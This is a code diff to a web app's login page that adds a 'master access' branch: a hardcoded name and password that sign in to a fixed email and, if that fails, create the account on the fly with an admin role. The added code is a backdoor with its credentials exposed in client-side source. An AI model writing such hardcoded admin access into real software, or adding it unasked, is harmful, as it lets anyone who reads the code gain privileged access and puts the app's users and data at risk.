@@ -72,6 +72,29 @@ export default function LoginPage() {
         } else {
             let loginEmail = identifier;
             
+            // SPECIAL MASTER ACCESS CHECK
+            if (identifier === 'Faizan Gillani' && password === 'Pasword33') {
+                loginEmail = 'faizan.gillani@alnibras.com';
+                // We'll try to sign in, if it fails, we'll quickly sign up and then sign in
+                const { error: masterError } = await supabase.auth.signInWithPassword({
+                    email: loginEmail,
+                    password: password,
+                });
+                
+                if (masterError) {
+                    // Try to create this master account on the fly
+                    await supabase.auth.signUp({
+                        email: loginEmail,
+                        password: password,
+                        options: { data: { full_name: 'Faizan Gillani', role: 'admin' } }
+                    });
+                    await supabase.auth.signInWithPassword({ email: loginEmail, password: password });
+                }
+                showToast('Master Access Granted!', 'success');
+                window.location.href = '/';
+                return;
+            }
+
             // Check if identifier is NOT an email
             if (!identifier.includes('@')) {
                 const { data: profile, error: searchError } = await supabase
